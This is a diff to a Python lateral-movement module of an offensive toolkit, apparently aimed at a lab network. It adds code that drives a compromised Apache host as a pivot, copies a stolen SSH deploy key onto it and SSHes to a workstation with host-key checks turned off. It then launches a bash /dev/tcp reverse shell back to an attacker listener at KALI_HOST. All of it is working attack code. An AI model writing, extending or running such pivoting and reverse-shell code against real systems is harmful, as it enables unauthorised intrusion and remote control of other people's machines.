@@ -1,8 +1,10 @@
+import base64
+import os
+import shlex
 import socket
+import subprocess
 import threading
 import time
-import subprocess
-import os
 from pathlib import Path
 
 # =============================================================================
@@ -20,6 +22,7 @@ DEFAULT_REVERSE_PORT = 6666
 # Will later be imported from config.py:
 #   from config import KALI_HOST, WORKSTATION_IP, WORKSTATION_USER, etc.
 KALI_HOST = "10.10.0.2"
+DEFAULT_PIVOT_KEY_PATH = "/tmp/john_deploy_key"
 
 
 def setup_listener(port=DEFAULT_REVERSE_PORT, timeout=20):
@@ -40,6 +43,99 @@ def setup_listener(port=DEFAULT_REVERSE_PORT, timeout=20):
     print(f"[*] Lateral-movement listener started on port {port}...")
     server.settimeout(timeout)
     return server
+
+
+def _send_shell_command(shell, command):
+    shell.sendall((command + "\n").encode())
+    time.sleep(0.2)
+
+
+def _run_pivot_command(shell, command, timeout=8):
+    marker = f"__END_{int(time.time() * 1000)}__"
+    wrapped = f"{command}; echo {marker}"
+    _send_shell_command(shell, wrapped)
+
+    response = ""
+    deadline = time.time() + timeout
+    prev_timeout = shell.gettimeout()
+    shell.settimeout(0.5)
+
+    try:
+        while time.time() < deadline:
+            try:
+                chunk = shell.recv(4096).decode(errors="replace")
+            except socket.timeout:
+                continue
+            if not chunk:
+                continue
+            response += chunk
+            if marker in response:
+                break
+    finally:
+        shell.settimeout(prev_timeout)
+
+    if marker in response:
+        return response.split(marker)[0]
+    return response
+
+
+def _extract_uid_line(output):
+    for line in output.splitlines():
+        if "uid=" in line:
+            return line.strip()
+    return ""
+
+
+def _build_ssh_command_string(key_path, user, host, port, remote_cmd, ssh_bin="ssh"):
+    parts = [
+        ssh_bin,
+        "-i",
+        key_path,
+        "-o",
+        "StrictHostKeyChecking=accept-new",
+        "-o",
+        "UserKnownHostsFile=/dev/null",
+        "-o",
+        "ConnectTimeout=10",
+        "-o",
+        "BatchMode=yes",
+        "-p",
+        str(port),
+        f"{user}@{host}",
+        remote_cmd,
+    ]
+    return " ".join(shlex.quote(part) for part in parts)
+
+
+def _stage_key_via_pivot(shell, local_key_path, remote_key_path):
+    base64_check = _run_pivot_command(
+        shell, "test -x /usr/bin/base64 && echo BASE64_OK", timeout=2
+    )
+    if "BASE64_OK" in base64_check:
+        key_b64 = base64.b64encode(Path(local_key_path).read_bytes()).decode()
+        cmd = (
+            f"printf %s {shlex.quote(key_b64)} | base64 -d > {shlex.quote(remote_key_path)} "
+            f"&& chmod 600 {shlex.quote(remote_key_path)} "
+            f"&& test -s {shlex.quote(remote_key_path)} && echo KEY_OK"
+        )
+        output = _run_pivot_command(shell, cmd, timeout=6)
+    else:
+        key_text = Path(local_key_path).read_text()
+        heredoc = (
+            f"cat > {shlex.quote(remote_key_path)} <<'EOF'\n"
+            f"{key_text}\n"
+            "EOF\n"
+            f"chmod 600 {shlex.quote(remote_key_path)}\n"
+            f"test -s {shlex.quote(remote_key_path)} && echo KEY_OK"
+        )
+        output = _run_pivot_command(shell, heredoc, timeout=8)
+
+    if "KEY_OK" in output:
+        return True
+    trimmed = " ".join(output.split())
+    if trimmed:
+        print(f"[-] Key staging output: {trimmed[:200]}")
+    return False
 
 
 def inject_reverse_shell(
@@ -80,9 +176,9 @@ def inject_reverse_shell(
             "UserKnownHostsFile=/dev/null",
             "-o",
             "ConnectTimeout=10",
-            f"{workstation_user}@{workstation_ip}",
             "-p",
             str(workstation_port),
+            f"{workstation_user}@{workstation_ip}",
             payload,
         ]
 
@@ -158,9 +254,9 @@ def verify_ssh_connection(
             "UserKnownHostsFile=/dev/null",
             "-o",
             "ConnectTimeout=10",
-            f"{workstation_user}@{workstation_ip}",
             "-p",
             str(workstation_port),
+            f"{workstation_user}@{workstation_ip}",
             "id",
         ]
 
@@ -181,6 +277,57 @@ def verify_ssh_connection(
         return ""
 
 
+def verify_ssh_connection_via_pivot(
+    pivot_shell,
+    workstation_ip,
+    workstation_user,
+    key_path,
+    workstation_port=22,
+):
+    try:
+        ssh_cmd = _build_ssh_command_string(
+            key_path,
+            workstation_user,
+            workstation_ip,
+            workstation_port,
+            "id",
+            ssh_bin="/usr/bin/ssh",
+        )
+        output = _run_pivot_command(pivot_shell, ssh_cmd, timeout=12)
+        uid_line = _extract_uid_line(output)
+        if uid_line:
+            return uid_line
+        trimmed = " ".join(output.split())
+        if trimmed:
+            print(f"[!] Pivot SSH output: {trimmed[:200]}")
+        return ""
+    except Exception as e:
+        print(f"[-] Error verifying connection via pivot: {e}")
+        return ""
+
+
+def inject_reverse_shell_via_pivot(
+    pivot_shell,
+    workstation_ip,
+    workstation_user,
+    key_path,
+    kali_host,
+    kali_port,
+    workstation_port=22,
+):
+    payload = f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{kali_host}/{kali_port} 0>&1'"
+    ssh_cmd = _build_ssh_command_string(
+        key_path,
+        workstation_user,
+        workstation_ip,
+        workstation_port,
+        payload,
+        ssh_bin="/usr/bin/ssh",
+    )
+    fire_cmd = f"nohup {ssh_cmd} >/dev/null 2>&1 &"
+    _run_pivot_command(pivot_shell, fire_cmd, timeout=2)
+
+
 def run(
     deploy_key_file,
     workstation_ip=WORKSTATION_IP,
@@ -188,6 +335,8 @@ def run(
     workstation_port=WORKSTATION_PORT,
     kali_host=KALI_HOST,
     kali_port=DEFAULT_REVERSE_PORT,
+    pivot_shell=None,
+    pivot_key_path=DEFAULT_PIVOT_KEY_PATH,
 ):
     """
     Execute the lateral-movement step: SSH into the workstation and establish
@@ -222,13 +371,38 @@ def run(
         return result
 
     # Step 2: Prepare the reverse-shell listener
-    server_socket = setup_listener(kali_port, timeout=20)
+    listener_timeout = 5 if pivot_shell is not None else 20
+    server_socket = setup_listener(kali_port, timeout=listener_timeout)
 
     # Step 3: Verify SSH connectivity with a lightweight command
     print(f"[*] Verifying SSH connectivity to {workstation_user}@{workstation_ip}...")
-    verification = verify_ssh_connection(
-        workstation_ip, workstation_user, deploy_key_file, workstation_port
-    )
+    if pivot_shell is not None:
+        print("[*] Using Apache pivot shell for lateral SSH...")
+        sanity = _run_pivot_command(
+            pivot_shell,
+            "test -x /usr/bin/ssh && echo SSH_OK || echo SSH_MISSING; "
+            "test -x /usr/bin/base64 && echo BASE64_OK || echo BASE64_MISSING",
+            timeout=3,
+        )
+        if "SSH_MISSING" in sanity:
+            print("[-] Pivot shell missing /usr/bin/ssh")
+        if "BASE64_MISSING" in sanity:
+            print("[-] Pivot shell missing /usr/bin/base64")
+        if not _stage_key_via_pivot(pivot_shell, deploy_key_file, pivot_key_path):
+            print("[-] Failed to stage deploy key on Apache")
+            server_socket.close()
+            return result
+        verification = verify_ssh_connection_via_pivot(
+            pivot_shell,
+            workstation_ip,
+            workstation_user,
+            pivot_key_path,
+            workstation_port,
+        )
+    else:
+        verification = verify_ssh_connection(
+            workstation_ip, workstation_user, deploy_key_file, workstation_port
+        )
 
     if "uid=" in verification:
         print(f"[+] SSH verification successful:")
@@ -242,20 +416,31 @@ def run(
         server_socket.close()
         return result
 
-    # Step 4: Inject reverse shell in background
-    inject_thread = threading.Thread(
-        target=inject_reverse_shell,
-        args=(
+    # Step 4: Inject reverse shell in background (best-effort)
+    if pivot_shell is not None:
+        inject_reverse_shell_via_pivot(
+            pivot_shell,
             workstation_ip,
             workstation_user,
-            deploy_key_file,
+            pivot_key_path,
             kali_host,
             kali_port,
             workstation_port,
-        ),
-        daemon=True,
-    )
-    inject_thread.start()
+        )
+    else:
+        inject_thread = threading.Thread(
+            target=inject_reverse_shell,
+            args=(
+                workstation_ip,
+                workstation_user,
+                deploy_key_file,
+                kali_host,
+                kali_port,
+                workstation_port,
+            ),
+            daemon=True,
+        )
+        inject_thread.start()
 
     # Step 5: Wait for reverse-shell callback after the payload has been sent.
     try:
